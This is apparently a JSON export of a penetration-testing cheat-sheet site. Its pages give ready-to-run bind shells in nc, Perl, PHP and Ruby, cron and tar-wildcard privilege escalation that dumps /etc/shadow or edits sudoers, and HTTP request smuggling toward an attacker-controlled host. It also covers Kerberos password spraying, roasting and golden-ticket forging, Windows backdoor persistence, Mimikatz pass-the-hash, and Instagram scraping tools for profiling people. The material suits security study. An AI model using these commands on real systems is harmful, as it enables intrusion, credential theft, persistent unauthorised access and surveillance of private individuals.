	"content": " Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc -lvp 51337 \u0026gt;/tmp/f \nWindows msfvenom -p windows/shell_bind_tcp -b “\\x00\\x0a\\x0d” LHOST=IP LPORT=1337 -f asp \u0026gt; acknak_TCP_RS.asphttps://github.com/besimorhino/powercat # Victim (listen) . .\\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\\powercat.ps1 powercat -c 127.0.0.1 -p 7002 \nPerl perl -e \u0026#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));\\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\ close C){open(STDIN,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);exec(\u0026#34;/bin/bash -i\u0026#34;);};\u0026#39; \nPHP php -r \u0026#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\u0026#34;0.0.0.0\u0026#34;,51337);\\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\u0026#34;$ \u0026#34;,2))exit;\\ $in=socket_read($cl,100);$cmd=popen(\u0026#34;$in\u0026#34;,\u0026#34;r\u0026#34;);while(!feof($cmd)){$m=fgetc($cmd);\\ socket_write($cl,$m,strlen($m));}}\u0026#39; \nRuby ruby -rsocket -e \u0026#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,s,s,s)\u0026#39;"
},
{
	"uri": "/web-pentest/content-management-system-cms/cmsmap/",
	"title": "CMSMap",
	"tags": [],
	"description": "",
	"content": " Intro # CMSmap is a python open source CMS scanner that automates the process # of detecting security flaws of the most popular CMSs. # The main purpose of CMSmap is to integrate common vulnerabilities for # different types of CMSs in a single tool. # At the moment, CMSs supported by CMSmap are WordPress, Joomla, Drupal and Moodle. \nUsage usage: cmsmap [-f W/J/D] [-F] [-t] [-a] [-H] [-i] [-o] [-E] [-d] [-u] [-p] [-x] [-k] [-w] [-v] [-h] [-D] [-U W/J/D] [target] CMSmap tool v1.0 - Simple CMS Scanner Author: Mike Manzotti Scan: target target URL (e.g. \u0026#39;https://example.com:8080/\u0026#39;) -f W/J/D, --force W/J/D force scan (W)ordpress, (J)oomla or (D)rupal -F, --fullscan full scan using large plugin lists. False positives and slow! -t , --threads number of threads (Default 5) -a , --agent set custom user-agent -H , --header add custom header (e.g. \u0026#39;Authorization: Basic ABCD...\u0026#39;) -i , --input scan multiple targets listed in a given file -o , --output save output in a file -E, --noedb enumerate plugins without searching exploits -c, --nocleanurls disable clean urls for Drupal only -s, --nosslcheck don\u0026#39;t validate the server\u0026#39;s certificate -d, --dictattack run low intense dictionary attack during scanning (5 attempts per user) Brute-Force: -u , --usr username or username file -p , --psw password or password file -x, --noxmlrpc brute forcing WordPress without XML-RPC Post Exploitation: -k , --crack password hashes file (Require hashcat installed. For WordPress and Joomla only) -w , --wordlist wordlist file Others: -v, --verbose verbose mode (Default false) -h, --help show this help message and exit -D, --default rum CMSmap with default options -U, --update use (C)MSmap, (P)lugins or (PC) for both Examples: cmsmap.py https://example.com cmsmap.py https://example.com -f W -F --noedb -d cmsmap.py https://example.com -i targets.txt -o output.txt cmsmap.py https://example.com -u admin -p passwords.txt cmsmap.py -k hashes.txt -w passwords.txt"
},
{
	"uri": "/linux-systems/privilege-escalation/crontab/",
	"title": "Crontab",
	"tags": [],
	"description": "",
	"content": " Tar wildcard + root cron # If a privilegied script is used to backup something or just uses tar * in a folder you have write access # You can exploit it to gain root access # Create 3 files in the folder touch -- \u0026#34;--checkpoint=1\u0026#34; touch -- “--checkpoint-action=exec=sh\\ shell.sh” touch shell.sh # Then put your payload in the shell.sh script (#!/bin/sh) cat /etc/shadow \u0026gt; outfile.txt \nExploiting crontab # If a script is running with higher privileges echo \u0026#34;cat /challenge/app-script/ch4/.passwd \u0026gt;/tmp/cracked\u0026#34; \u0026gt; cron.d/go \u0026amp;\u0026amp; chmod a+x cron.d/go \u0026amp;\u0026amp; sleep 60 \u0026amp;\u0026amp; cat /tmp/cracked # Get user ID cat /etc/passwd | grep shell4cracked # C program to get a shell #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { setresuid(1028, 1028, 1028); setresuid(1028, 1028, 1028); system(\u0026#34;/bin/bash\u0026#34;); return 0; } # Compile and prepare gcc -o /tmp/pwned /tmp/._cron/shell.c chmod +s /tmp/pwned chmod a+rwx /tmp/pwned \nWritable CRON directory # In /tmp # LD_AUDIT=\u0026#34;libpcprofile.so\u0026#34; PCPROFILE_OUTPUT=\u0026#34;/etc/cron.d/exploit\u0026#34; ping # since it won\u0026#39;t find the .so, the file from PCPROFILE_OUTPUT will be written as word writeable # Then insert payload inside to create suid root program in /tmp printf “***** root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exmploit\\n” \u0026gt; /etc/cron.d/exploit cat /etc/cron.d/exploit ll ./exploit whoami# New crontab touch /tmp/test /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test echo -e \u0026#39;#!/bin/bash\\necho \u0026#34;eric ALL=(ALL) NOPASSWORD:ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\u0026#39; \u0026gt; /etc/cron.hourly/test chmod +x /etc/cron.hourly/test cat /etc/chron.hourly/test \n"
},
{
	"uri": "/resources/cti/",
	"title": "Cyber Threat Intel",
	"tags": [],
	"description": "",
	"content": " Some CTI Resources  Threat Actor Map (https://aptmap.netlify.app/#) Darknet Markets For Investigators (https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/)  \nNot really CTI Related but can help  Le Dessous des Cartes (Geopolitics) (https://www.youtube.com/c/LeDessousdesCartesARTE/videos)  \nTraining and learning  A Cyber Threat Intelligence Self-Study Plan: Part 1 (https://medium.com/katies-five-cents/a-cyber-threat-intelligence-self-study-plan-part-1-968b5a8daf9a)   Tools and Usable informations  Certstream project (https://certstream.calidog.io/)  "
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/",
	"title": "Datasploit",
	"tags": [],
	"description": "",
	"content": " General Informations # Performs automated OSINT on a domain / email / username / IP and find out relevant information from different sources. # Easy to contribute OSINT Framework. # Code for Banner, Main and Output function. Datasploit automagically do rest of the things for you. # Useful for Pen-testers, Bug Bounty Hunters, Cyber Investigators, Product companies, Security Engineers, etc. # Collaborate the results, show them in a consolidated manner. # Tries to find out credentials, api-keys, tokens, subdomains, domain history, legacy portals, usernames, dumped accounts, etc. related to the target. # Can be used as library, automated scripts or standalone scripts. # Can generate lists which can be feeded to active scan tools. # Generates HTML, along with text files. # If “module” error in the venv → python -m pip install pip==9.0.3 # API keys needed in the config.py file # shodan_api, censysio_id, censysio_secret, zoomeyeuser, zoomeyepass, clearbit_apikey # emailhunter, fullcontact, google_cse_key, google_cse_cx, github_travis_key. \nUsage # Datasploit allows you to perform OSINT on domain name, email, username or phone number # Script nomemclature → All scripts meant to perform OSINT on domains start with keyword “domain_”. Similair thing for other OSINT types → Scripts with an underscore are standalone scripts and collects data of one specific kind → Scripts without an underscore are the ones used for automated collection of data using standalone scripts. Eg. domainOsint.py # As long as punkspider does not exist anymore, you can disable the module to avoid crash → ENABLED = False in /domain/domain_checkpunkspider.py # Help optional arguments: -h, --help show this help message and exit -i SINGLE_TARGET, --input SINGLE_TARGET Provide Input -f FILE_TARGET, --file FILE_TARGET Provide Input -a, --active Run Active Scan attacks -q, --quiet Run scans in automated manner accepting default answers -o OUTPUT, --output OUTPUT Provide Destination Directory # Usage python datasploit.py -i domain.com -a/-q python domainOsint.py -d example.com python domain_subdomains.py example.com"
},
{
	"uri": "/web-pentest/files-and-files-inclusions/",
	"title": "File &amp; File Inclusions",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/resources-discovery/http_request_smuggling/",
	"title": "HTTP Request Smuggling",
	"tags": [],
	"description": "",
	"content": " HTTP Request Smuggling https://portswigger.net/web-security/request-smuggling # Smuggler.py is a small tool used to test that python smuggler.py -h _ ___ _ __ ___ _ _ __ _ __ _| | ___ _ __ _ __ _ _ / __| \u0026#39;_ ` _ \\| | | |/ _` |/ _` | |/ _ \\ \u0026#39;__| | \u0026#39;_ \\| | | | \\__ \\ | | | | | |_| | (_| | (_| | | __/ | _ | |_) | |_| | |___/_| |_| |_|\\__,_|\\__, |\\__, |_|\\___|_| (_) | .__/ \\__, | |___/ |___/ |_| |___/ by @gwendallecoguic usage: smuggler.py [-h] [-a PATH] [-d HEADER] [-i TIMEOUT] [-m METHOD] [-o HOSTS] [-s SCHEME] [-t THREADS] [-u URLS] [-v VERBOSE] optional arguments: -h, --help show this help message and exit -a PATH, --path PATH set paths list -d HEADER, --header HEADER custom headers -i TIMEOUT, --timeout TIMEOUT set timeout, default 10 -m METHOD, --method METHOD set methods separated by comma, default: all -o HOSTS, --hosts HOSTS set host list (required or -u) -s SCHEME, --scheme SCHEME scheme to use, default: http,https -t THREADS, --threads THREADS threads, default 10 -u URLS, --urls URLS set url list (required or -o) -v VERBOSE, --verbose VERBOSE display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=requests+headers, 4=full debug, default: 1 \nRedirecting to Owned host https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142 # Request using Transfer-Encoding: chunked # Then, another request, toward controlled domain # You can use Burp Collaborator to prove it POST /xxxx HTTP/1.1 Transfer-Encoding: chunked Host: www.target.com ... data 0 GET /somefile HTTP/1.1 Host: myserv.com X-Ignore: X"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/",
	"title": "Human Investigation",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/instagram/",
	"title": "Instagram",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks Instagram ID # Instagram User ID can be very important to investigate # Each account has a unique user ID linked to the @username # Some websites allows to get it for an account https://codeofaninja.com/tools/find-instagram-user-id # You can then trace and spot re-used instagram account by # searching for old names and post, for example using # Google Dorks Mirrors # Instagram Mirrors can be usefull to browse Instagram accounts # Search features are less restrictive # Some deleted content can still be indexed https://rankersta.com/ https://pikdo.biz/ https://www.piwox.com/ https://gramfly.com/ https://web.stagram.com Downloaders # Instagram Online Downloaders https://downloadgram.com/ https://www.instadp.com/ https://www.instadp.com/ https://instasave.xyz/ Location Search https://twitter.com/quiztime/status/1339231557509402624 https://github.com/bellingcat/instagram-location-search # You can searh instagram posts for a specific location python3 instagram-locations.py --session \u0026#34;\u0026lt;session-id-token\u0026gt;\u0026#34; --lat 32.22 --lng -110.97 --csv locs.csv # Usage with date python3 instagram-locations.py --session \u0026#34;\u0026lt;session-id-token\u0026gt;\u0026#34; --lat 47.6164311 --lng -122.3203952 --map map.html --date 2020-06-09 \nManual investigation # Viewing Instagram accounts without being logged in # METHOD 1 - JSON # You can User ID, user bio, posts infos... # But you can only see the first 11 messages https://www.instagram.com/targetAccount https://www.instagram.com/targetAccount?__a=1 # METHOD 2 - Developper Tools # On the profile, go F12 # View the \u0026#34;\u0026lt;body class =\u0026#34; \u0026#34;style =\u0026#34; overflow: hidden; \u0026#34;\u0026gt;\u0026#34; section ==\u0026gt; visible # \u0026#34;\u0026lt;div class =\u0026#34; RnEpo Yx5HN \u0026#34;role = presentation\u0026#34;\u0026gt;\u0026#34; ==\u0026gt; Delete node # METHOD 3 - Adlocker # Ublock Origin ==\u0026gt; \u0026#34;Element Sector Mode\u0026#34; # Click on the Instagram pop-up # Add \u0026amp; Create : # - ##.Yx5HN.RnEpo # - ##body:style(overflow: visible !important;) # METHOD 4 : Images # Go to target account # Click on any image and browse using arrow keys # METHOD 5 : Embed # You can add /embed/captioned at the end of the URL to get the post /p/CGvIxnpFrzL/embed/captioned \nToutatis (https://github.com/megadose/toutatis/) # Toutatis is a small python script used to retrieve informations such as phone number or target e-mail. # It needs a valid session id (cookie) # You can also search for a bunch of profiles $ python toutatis.py -u starbucks -i ep -s \u0026lt;session_id\u0026gt; The informations about : starbucks User id : 1034466 Phone of starbucks : 18007827282 Mail of starbucks : info@starbucks.com \nOSI.IG # Simple python script used to scrape and parse data from Instagram # NOTE : pictures downloaded are sent to tinyurl $ python3 main.py -h usage: main.py [-h] -u USERNAME [-p] [-s] optional arguments: -h, --help show this help message and exit -u USERNAME, --username USERNAME username of account to scan -p, --postscrap scrape all uploaded images info -s, --savedata save data to file \nInstagramOSINT (https://github.com/sc1341/InstagramOSINT) # The Instagram OSINT Tool gets a range of information from an Instagram account # that you normally wouldn\u0026#39;t be able to get from just looking at their profile # Username # Profile Name # URL # Followers # Following # Number of Posts # Bio # Profile Picture URL # Is Business Account? # Connected to a FB account? # External URL # Joined Recently? # Business Category Name # Is private? # Is Verified? # Downloads Public Photos python3 main.py --username USERNAME \nInstaloader (https://github.com/instaloader/instaloader) # Downloads public and private profiles, hashtags, user stories,feeds and saved media, # Downloads comments, geotags and captions of each post, # Automatically detects profile name changes and renames the targetdirectory accordingly, # Allows fine-grained customization of filters and where to storedownloaded media. # Download public profile informations instaloader profile \u0026lt;profile-name\u0026gt; # Download private profile informations instaloader --login=\u0026lt;username\u0026gt; profile \u0026lt;profile-name\u0026gt; \nInstaLooter (https://github.com/althonos/InstaLooter) # Another tool used to download information on public profiles # No API call # Usage instalooter --usage / instalooter --help # Download all pictures from an account instalooter user \u0026lt;username\u0026gt; # Download single post instalooter post \u0026#34;https://www.instagram.com/p/BFB6znLg5s1/\u0026#34; ~/Pictures # Download the latest 20 pictures or videos tagged with python to /tmp instalooter hashtag python /tmp -n 20 -v -c MYLOGIN"
},
{
	"uri": "/windows-systems/exploitation/kerberos/",
	"title": "Kerberos",
	"tags": [],
	"description": "",
	"content": " Cheatsheet : https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a KRB5CONF : https://gist.github.com/kaluche/ba69e701624c2e44e3d1f60c5370cebe\nGeneral \u0026amp; Theory # Kerberos is just SSO, it\u0026#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC) \nNTLM vs NTLMv1/v2 vs Net-NTLMv1/v2 # NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing. # However, NTLM (without v1/v2) means something completely different. # NTLM hashes are stored in the SAM or NTDS database. # It is LMHASH:NTHASH # Net-NTLM hashes are used for network authentication # You CAN perform Pass-The-Hash attacks with NTLM hashes # You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes \nKerbrute # Bruteforcing Windows passwords with Kerberos is much faster than any other approach # And potentially stealthier since pre-authentication failures do not trigger that # \u0026#34;traditional\u0026#34; An account failed to log on event 4625. With Kerberos, you can validate # a username or test a login by only sending one UDP frame to the KDC (Domain Controller) # User enum (valid/invalid) ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt # Password spraying ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123 # Brute force one user (take care of policy!) ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman # General bruteforce (from username:password wordlist or from stdin) ./kerbrute -d lab.ropnop.com bruteforce - \nImpacket # GetTGT # Given a password, hash or aesKey, this script will request a TGT and save it as ccache. getTGT.py -hashes lm:nt domain.com/user# GetST # Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. # If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate # switch to request the ticket on behalf another user. getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user# GetUserSPNs # This example will try to find and fetch Service Principal Names that are associated with normal user accounts. # Output is compatible with JtR and HashCat. GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin# GetNPUsers # This example will attempt to list and get TGTs for those users that have the property # \u0026#39;Do not require Kerberos preauthentication\u0026#39; set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. # Get TGT for a user → GetNPUsers.py contoso.com/john.doe -no-pass # Get a list of users with UF_DONT_REQUIRE_PREAUTH set → GetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily # Request TGTs for all users → GetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily # Request TGTs for users in a file → GetNPUsers.py contoso.com/ -no-pass -usersfile users.txt# ticketer # This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC). ticketer.py -nthash \u0026lt;krbtgt/service nthash\u0026gt; -domain-sid \u0026lt;your domain SID\u0026gt; -domain \u0026lt;your domain FQDN\u0026gt; baduser# raiseChild # This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. python raiseChild.py childDomain.net/adminuser python raiseChild.py childDomain.net/adminuser:mypwd python raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser # This will perform the attack and then psexec against target-exec as Enterprise Admin python raiseChild.py -target-exec targetHost childDomainn.net/adminuser # This will save the final goldenTicket generated in the ccache target file python raiseChild.py -w ccache childDomain.net/adminuser \nTechnical tips # All the Impacket scripts support Kerberos authentication as well: # -k -no-pass # must specify host as FQDN and user as realm/user # MISC # - NETLOGON is inefficient (SMB, rpcclient) # - RDP is slow # - LDAP binds are faster but still result in event 4625 # Ask for password kinit user # Events ID # - Failing Kerberos pre-authentication DOES NOT trigger a Logon failure event (4625): # - Have to manually specify event logging for Kerberos (which is in a different location) # - If you\u0026#39;re only logging on traditional “Logon failures”, you\u0026#39;d miss this. # - Now failures will be logged as event 4771. # - So Kerberos pre-auth is a faster and potentially stealthier way to bf password. \nNTLM Auth Disabled # Some orgs have fully disabled NTLM and rely solely on Kerberos (it\u0026#39;s rare) # - A lot of pentest tools don\u0026#39;t operate well in these environements # - MSF, CrackMapExec, etc. cause they rely on usernames/passwords or NT hashes # - if you have a password you can always do Kerberos auth, just exchange the password for a TGT, you can also “overpass-the-hash”. # SMB Error “STATUS_NOT_SUPPORTED” = NTLM Auth Not Supported → Kerberos wmiexec.py domain/user@hostname kinit user@domain KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py \nPassword Bruteforcing # Password bruteforcing # - Care at policy, lockout is mostly at 3 failed attempts. # - Windows security events are logged for every failed login attempts. # - Usually tries SMB and has to set up a connection at every attempt. # - Horizontal bruteforcing is a better approach # - Choose 1 or 2 common passwords, test them for every domain user # Password guessing with Kerberos ! Only 2 frames to check password and it\u0026#39;s UDP no TCP overhead. # https://github.com/ropnop/kerberos_windows_scripts contains scripts to BF password using kinit ! # It\u0026#39;s still lockout account, putting DC as an IP address saves us a DNS lookup each time (even faster). script.sh \u0026lt;domain\u0026gt; \u0026lt;DC\u0026gt; \u0026lt;userlist\u0026gt; PasswordToTest \nService Principal Names (SPN) # Service Principal Names (SPNs) are used in AD to tie services into Kerberos authentication # Common SPN directory: http://adsecurity.org/?page_id=183 # To find SPN you can use LDAP: ldapsearch -LLL -x -H ldap://pdc01.domain.com -D \u0026#34;user@domain\u0026#34; -W -b \u0026#34;dc=lab,dc=ropnop,dc=com\u0026#34; \u0026#34;servicePrincipalName=*\u0026#34; sAMAccountName servicePrincipalName # You can request a TGS for a SPN, e.g. to access RDP, use TGT to request TGS for TERMSRV/PDC01 # The TGS is encrypted with the service accounts NTLM password hash. # It\u0026#39;s possible to crack TGS offline, but cracking a TGS for a service SPN is generally useless UNLESS the SPN is tied to a user account. \nASREP Roasting # AS-REP roasting is an attack against Kerberos for user that don\u0026#39;t require preauthentication # During preauthentication, a user will enter their password which will be used to encrypt a timestamp # and then the domain controller will attempt to decrypt it and validate that the right password was used and that # it is not replaying a previous request. From there, the TGT will be issued for the user to use for future # authentication. If preauthentication is disabled, an attacker could request authentication data for any user and # the DC would return an encrypted TGT that can be brute-forced offline. # Using impacket # check ASREPRoast for all domain users (credentials required) python GetNPUsers.py domain/user:passwrd -request -format [hashcat|john] -outputfile outfile # check ASREPRoast for a list of users (no credentials required) python GetNPUsers.py domain/ -usersfile \u0026lt;users_file\u0026gt; -format [hashcat|john] -outputfile outfile # Using Rubeus .\\Rubeus.exe asreproast /format:[hashcat|john] /outfile:file Kerberoasting # For service accounts, it\u0026#39;s common to set SPNs to user accounts, the TGS is then encrypted with the user\u0026#39;s NTLM password hash: # - It\u0026#39;s called “Kerberoasting” and presented by Tim Medin at Derbycon 2015. # Kerberoasting requires a valid domain account. # Three step process: # - Find SPN tied to user accounts through LDAP (service accounts) # - Request a TGS for each SPN # - Crack the TGS offline to recover the service account\u0026#39;s password # Impacket makees this easy with GetUserSPNs.py # Will automatically LDAP query then request and TGS in JtR/Hashcat format. GetUserSPNs.py -dc-ip 10.10.10.100 -outputfile kerberos_hashes.txt -request -debug active.htb/SVC_TGS:GPPstillStandingStrong2k18 # You may encounter issue with timezone, you can fix it out that way: • service ntp stop # Comment server line in /etc/ntp.conf timedatectl set-ntp false # Get time of the target: ldapsearch -LLL -x -H ldap://10.10.10.100 -b \u0026#39;\u0026#39; -s base \u0026#39;(objectclass=*)\u0026#39; See this =\u0026gt; currentTime: 20180921143415.0Z (21/09/2018 at 14h34m15s) dpkg-reconfigure tzdata (define None of the above, then GMT) date --set=\u0026#34;Fri 21 Sep 2018 14:35:00\u0026#34; # Verify using several times “date” # Once you get a TGS you can crack it that way using either hashcat or john the ripper from bleeding repo: # You have to be in that folder /home/user/Desktop/Certifs/OSCP/Tools/PasswordCracking/JohnTheRipper/run ./john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --fork=4 --format=krb5tgs /home/user/Desktop/HackTheBox/VM/Active/kerberos_hashes.txt# Now you can perform such attacks without having access to LDAP # The mentionned version of GetUserSPNs also patches some common errors https://swarm.ptsecurity.com/kerberoasting-without-spns/ # If you managed to extract user list before, you can use it GetUserSPNs.py DOMAIN.COM/Administrator:Pass -usersfile user.txt# Over Pass the Hash (how can you do Kerberos auth without a password ?) # - AS requests to get a TGT, it encrypts the nonce with the NT hash of the password (hash = encryption key) # - So you can request a TGT with only the NT hash # Forging Kerberos Tickets: # - Using Mimikatz or Impacket we can forge TGTs or TGSs # - Golden Ticket # - Forging a TGT (and the included PAC) # - Requires tje krbtgt key, the “master” encryption key from the KDC # - Can be used to request any TGS from the Domain Controller # - Silver Ticket # - Forging a TGS (and included PAC) # - Requires the machine account password (key) from the KDC # - Can be used to directly access any service (without touching DC) ticket.py --aesKey \u0026lt;xxxxxxxx\u0026gt; --domain-sid \u0026lt;S-1-xxxxxxx\u0026gt; --domain \u0026lt;domain\u0026gt; --duration \u0026lt;days\u0026gt; --groups \u0026lt;RIDs\u0026gt; \u0026lt;username\u0026gt; secretsdump.py --just-dc-user krbtgt DOMAIN/user@IPDC # Silver ticket is useful for persistence to a single host/service combo # - Stealthier than Golden Tickets - you never need to actually contact the DC # - It needs the machine accounts Kerberos key, machine accounts usually end in $ # - You must specify the service you need. # Called “over-pass-the-hash”, natively with ktuitl and with Impacket. \nSpeaking Kerberos from Linux # Tool apt-get install heimdal-clients # Setting up # Add Windows AD realm to /etc/krb5.conf # You can figure names out through SRV DNS records [libdefault] default_realm = LAB.ROPNOP.COM [realms] LAB.ROPNOP.COM = { kdc = pdc01.lab.ropnop.com admin_server = pdc01.lab.ropnop.com default_domain = pdc01.lab.ropnop.com } [domain_realm] lab.ropnop.com = LAB.ROPNOP.COM .lab.ropnop.com = LAB.ROPNOP.COM # DNS must be properly configured (/etc/resolv.conf) domain lab.ropnop.com search lab.ropnop.com nameserver 172.16.13.100 # Time must be sync apt-get install rdate rdate -n \u0026lt;DC\u0026gt; # Get a TGT (kinit is used to check out a TGT from the DC) kinit user@REALM # list current tickets (if all is ok, you\u0026#39;ll get a TGT from the DC) klist # Now any tool that supports Kerberos auth can be used with your cache. # GSSAPI = Kerberos =\u0026gt; Auth mechanism that Kerberos 5 uses. # Most tools use environment variable KRB5CCNAME to point to current cache, if not set automatically: # export KRB5CCNAME=/tmp/krb5cc_0 # smbclient smbclient --kerberos //client01.lab.ropnop.com/IPC$ # rpcclient rpcclient -k client01.lab.ropnop.com \nExtracting tickets from rubeus dump https://github.com/curi0usJack/rubeus2ccache # Run rubeus to dump tickets rubeus dump /service:krbtgt \u0026gt; output.txt # Extract python3 rubeus2ccache.py -i output.txt # Then load tickets into tools..."
},
{
	"uri": "/passcracking-hashfiles/misc_others/",
	"title": "MISC &amp; Others",
	"tags": [],
	"description": "",
	"content": " Argon2 cracker https://github.com/CyberKnight00/Argon2_Cracker # Argon2 is a key derivation function that was selected as the winner of the Password Hashing # Competition in July 2015. It is designed by Alex Biryukov, Daniel Dinu, and Dmitry Khovratovich # from University of Luxembourg. Argon2 has 3 variants : Argon2d, Argon2i and Argon2id. ./crack_argon2.py -c \u0026#39;\u0026lt; Argon2 Hash \u0026gt;\u0026#39; -w \u0026#39;\u0026lt; Path/To/Wordlist \u0026gt;\u0026#39;"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/persistence/",
	"title": "Persistence",
	"tags": [],
	"description": "",
	"content": " Resources https://rastamouse.me/2018/03/a-view-of-persistence/ \nUserland \u0026amp; Elevated # Userland techniques # HKCU # Create a REG_SZ value in the Run key within HKCU\\Software\\Microsoft\\Windows. (Other keys are available). Value name: Backdoor Value data: C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe # Start-up # Create a batch script in the user startup folder. PS C:\\\u0026gt; gc C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat start /b C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe # Scheduled Tasks PS C:\\\u0026gt; $A = New-ScheduledTaskAction -Execute \u0026#34;cmd.exe\u0026#34; -Argument \u0026#34;/c C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\u0026#34; PS C:\\\u0026gt; $T = New-ScheduledTaskTrigger -AtLogOn -User \u0026#34;Rasta\u0026#34; PS C:\\\u0026gt; $P = New-ScheduledTaskPrincipal \u0026#34;Rasta\u0026#34; PS C:\\\u0026gt; $S = New-ScheduledTaskSettingsSet PS C:\\\u0026gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\\\u0026gt; Register-ScheduledTask Backdoor -InputObject $D # Powershell profiles # You can backdoor the powershell profile PS C:\\\u0026gt; Test-Path $profile False PS C:\\\u0026gt; New-Item -Path $profile -Type File –Force Directory: C:\\Users\\Rasta\\Documents\\WindowsPowerShell Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 22/03/2018 12:42 0 Microsoft.PowerShell_profile.ps1 PS C:\\\u0026gt; $string = \u0026#39;Start-Process \u0026#34;cmd.exe\u0026#34;\u0026#39; PS C:\\\u0026gt; $string | Out-File -FilePath \u0026#34;C:\\Users\\Rasta\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\u0026#34; -Append# Elevated techniques # HKLM # Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\\Software\\Microsoft\\Windows Value name: Backdoor Value data: C:\\Windows\\Temp\\backdoor.exe # Services # Create a service that will start automatically or on-demand. PS C:\\\u0026gt; New-Service -Name \u0026#34;Backdoor\u0026#34; -BinaryPathName \u0026#34;C:\\Windows\\Temp\\backdoor.exe\u0026#34; -Description \u0026#34;Nothing to see here.\u0026#34; # Scheduled Tasks PS C:\\\u0026gt; $A = New-ScheduledTaskAction -Execute \u0026#34;cmd.exe\u0026#34; -Argument \u0026#34;/c C:\\Windows\\Temp\\backdoor.exe\u0026#34; PS C:\\\u0026gt; $T = New-ScheduledTaskTrigger -Daily -At 9am PS C:\\\u0026gt; $P = New-ScheduledTaskPrincipal \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; -RunLevel Highest PS C:\\\u0026gt; $S = New-ScheduledTaskSettingsSet PS C:\\\u0026gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\\\u0026gt; Register-ScheduledTask Backdoor -InputObject $D \nMaintaining Privilege # Steal passwords and use them with runas runas /netonly /user:FS01\\Administrator cmd# If you can’t get passwords, use NTLM hashes with techniques such as Pass-the-Hash or psexec. # Both domain accounts and local accounts can work. mimikatz\u0026gt; sekurlsa::pth /user:Administrator /domain:FS01 /rc4:fc525c9683e8fe067095ba2ddc971889 /ptt# Adding new local users can be a method to get back into machines # Administrators local group is a solution, but you can also use the following groups Remote Desktop Users Remote Management Users Backup Operators# With the NTLM hash of a computer account, silver tickets can be used to regain local admin privileges via the CIFS service. mimikatz\u0026gt; kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt# Golden tickets 